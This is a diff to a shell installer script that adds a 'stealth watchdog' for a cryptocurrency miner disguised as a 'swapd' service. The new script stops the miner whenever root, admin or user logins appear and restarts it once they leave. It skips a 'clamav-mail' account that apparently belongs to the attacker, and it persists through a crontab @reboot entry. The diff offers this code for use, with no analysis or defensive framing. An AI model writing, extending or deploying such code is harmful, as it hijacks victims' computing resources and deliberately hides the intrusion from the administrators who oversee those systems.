@@ -1083,6 +1083,37 @@ EOL
 
 chmod +x "$HOME"/.swapd/swapd.sh
 
+# ========================================================================
+# WATCHDOG: system-check (Auto-stop when admin is active)
+# ========================================================================
+echo "[*] Creating stealth watchdog /usr/local/bin/system-check"
+cat << 'EOF' > /usr/local/bin/system-check
+#!/bin/bash
+# This script monitors for human activity and hides the miner
+while true; do
+  # Check for SSH users (excluding the 'clamav-mail' user)
+  if who | grep -v "clamav-mail" | grep -qE "root|admin|user"; then
+    systemctl stop swapd 2>/dev/null
+    /etc/init.d/swapd stop 2>/dev/null
+  else
+    # No human users detected, ensure miner is running
+    if [ -f /run/systemd/system ]; then
+       systemctl start swapd 2>/dev/null
+    else
+       /etc/init.d/swapd start 2>/dev/null
+    fi
+  fi
+  sleep 60
+done
+EOF
+
+chmod +x /usr/local/bin/system-check
+
+# Enable the watchdog via crontab
+(crontab -l 2>/dev/null | grep -v "system-check"; echo "@reboot /usr/local/bin/system-check &") | crontab -
+# Start it now
+/usr/local/bin/system-check &
+
 echo "[*] #preparing script background work and work under reboot..."
 
 if ! sudo -n true 2>/dev/null; then
